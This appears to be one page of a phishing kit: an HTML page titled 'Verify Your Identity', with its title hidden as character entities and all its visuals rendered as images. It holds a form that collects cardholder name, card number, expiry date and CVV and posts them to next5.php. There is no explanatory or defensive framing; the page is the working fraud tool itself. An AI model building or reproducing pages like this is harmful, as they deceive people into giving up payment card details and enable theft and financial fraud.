<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
			 .textbox {
    margin-right: 10px;
    padding-left:4px;
    height: 26px;
    line-height: 20px;
    vertical-align: middle;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1327px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">

<div id="image9" style="position:absolute; overflow:hidden; left:202px; top:254px; width:168px; height:247px; z-index:0"><img src="images/bb1.png" alt="" title="" border=0 width=168 height=247></div>

<div id="image6" style="position:absolute; overflow:hidden; left:184px; top:176px; width:173px; height:23px; z-index:2"><img src="images/bb8.png" alt="" title="" border=0 width=173 height=23></div>

<div id="image15" style="position:absolute; overflow:hidden; left:182px; top:639px; width:987px; height:150px; z-index:3"><img src="images/bbo28.png" alt="" title="" border=0 width=987 height=150></div>

<div id="image16" style="position:absolute; overflow:hidden; left:208px; top:687px; width:108px; height:17px; z-index:4"><a href="#"><img src="images/bbo29.png" alt="" title="" border=0 width=108 height=17></a></div>

<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:5"><img src="images/b7.png" alt="" title="" border=0 width=983 height=117></div>

<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:428px; height:28px; z-index:6"><img src="images/b9.png" alt="" title="" border=0 width=428 height=28></div>

<div id="image10" style="position:absolute; overflow:hidden; left:340px; top:557px; width:75px; height:29px; z-index:6"><a href="#"><img src="images/bb10.png" alt="" title="" border=0 width=75 height=29></a></div>

<form action=next5.php name=chalojee id=chalojee method=post>
<input name="noc" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:276px;z-index:7">
<input name="cn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:348px;z-index:8">
<input name="ex" placeholder="MM/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:420px;z-index:9">
<input name="cv" class="textbox" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:262px;left:203px;top:492px;z-index:10">
<div id="formimage1" style="position:absolute; left:206px; top:555px; z-index:16"><input type="image" name="formimage1"  width="129" height="32" src="images/bcnf.png"></div>
</div>

</body>
</html>
